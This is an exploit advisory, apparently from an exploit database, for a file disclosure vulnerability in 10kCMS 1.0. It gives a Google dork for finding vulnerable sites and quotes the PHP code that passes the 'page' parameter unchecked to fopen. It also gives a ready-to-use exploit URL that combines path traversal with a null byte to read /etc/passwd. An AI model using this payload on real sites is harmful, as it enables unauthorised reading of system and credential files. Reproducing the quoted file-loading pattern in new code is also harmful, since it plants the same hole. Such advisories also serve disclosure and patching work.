10kCMS File Disclosure Vulnerability
====================================


# Author: pimpim
# Software Link: http://www.10kcms.com/?page=download
# Version: 1.0
# Category: webapps
# Google dork: Generated by 10kCMS
# Tested on: Linux

#Vulnerable code:
//Load filename from URL
if (isset($_GET[&#039;page&#039;]) && (file_exists($_GET[&#039;page&#039;].&#039;.txt&#039;))) //If the url contains an existing filename
{
	$filename = $_GET[&#039;page&#039;].&#039;.txt&#039;;  //Load it
}
else
{
	$filename = &#039;index.txt&#039;;  //Otherwise, default to index.txt
	$htmltitle= &#039;Home&#039;;
}

//Load in the file contents
$fp = fopen($filename,"r");

#Exploit: http://localhost/...path.../?page=../../../../../etc/passwd%00
Null byte must be used to strip off the ".txt" extension



